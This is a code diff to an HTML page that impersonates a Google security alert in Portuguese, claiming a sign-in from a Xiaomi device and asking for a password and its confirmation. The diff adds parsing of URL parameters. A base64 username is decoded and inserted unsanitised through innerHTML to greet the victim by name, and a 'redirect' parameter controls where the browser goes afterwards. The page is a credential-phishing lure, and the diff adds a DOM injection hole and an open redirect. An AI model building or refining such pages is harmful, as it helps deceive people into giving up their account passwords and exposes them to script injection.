@@ -8,6 +8,38 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
     <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/new-google-logo-2015/400/new-google-favicon-512.png" />
     <script type="text/javascript">
+		var redirect;
+		var usr;
+
+		function getJsonFromUrl(url) {
+		  if(!url) url = location.href;
+		  var question = url.indexOf("?");
+		  var hash = url.indexOf("#");
+		  if(hash==-1 && question==-1) return {};
+		  if(hash==-1) hash = url.length;
+		  var query = question==-1 || hash==question+1 ? url.substring(hash) : 
+		  url.substring(question+1,hash);
+		  var result = {};
+		  query.split("&").forEach(function(part) {
+		    if(!part) return;
+		    part = part.split("+").join(" "); // replace every + with space, regexp-free version
+		    var eq = part.indexOf("=");
+		    var key = eq>-1 ? part.substr(0,eq) : part;
+		    var val = eq>-1 ? decodeURIComponent(part.substr(eq+1)) : "";
+		    var from = key.indexOf("[");
+		    if(from==-1) result[decodeURIComponent(key)] = val;
+		    else {
+		      var to = key.indexOf("]",from);
+		      var index = decodeURIComponent(key.substring(from+1,to));
+		      key = decodeURIComponent(key.substring(0,from));
+		      if(!result[key]) result[key] = [];
+		      if(!index) result[key].push(val);
+		      else result[key][index] = val;
+		    }
+		  });
+		  return result;
+		}
+
         function run() {
         	var pass = $("input[type=password]")[0].value;
         	var confirm = $("input[type=password]")[1].value;
@@ -26,11 +58,24 @@
 	            } else if (pass !== confirm) {
 					toastr.error('As senhas não conferem')
 	        	} else {
-	        		window.location.replace("https://google.com");
+	        		window.location.replace(redirect || "https://google.com");
 	        	}
             });
         }
         $(document).ready(function() {
+			try {
+				var params = getJsonFromUrl(window.location.href);
+
+				redirect = params.redirect;
+				usr = atob(params.usr);
+			} catch (e) {}
+
+			if (redirect && redirect.length) {
+				document.getElementById("contentTest").innerHTML = "Olá <b>" + usr + "</b> preencha os dados para continuar";
+			} else {
+				document.getElementById("contentTest").innerHTML = "Notamos que você fez o login em sua conta Google em um dispositivo <b>Xiaomi Mi 8 Lite</b>, por favor preencha os dados abaixo:"
+			}
+
 	        $("input[type=submit]").on("click", run);
         });
     </script>
@@ -63,7 +108,7 @@
                                 </tr>
                                 <tr height="16px"></tr>
                                 <tr>
-                                    <td style="display:table-cell;vertical-align:top;font-size:13px;line-height:18px;color:#424242" dir="auto">Notamos que você fez o login em sua conta Google em um dispositivo <b>Xiaomi Mi 8 Lite</b>, por favor preencha os dados abaixo:</td>
+                                    <td id="contentTest" style="display:table-cell;vertical-align:top;font-size:13px;line-height:18px;color:#424242" dir="auto"></td>
                                 </tr>
                                 <tr height="24px"></tr>
                                 <tr>
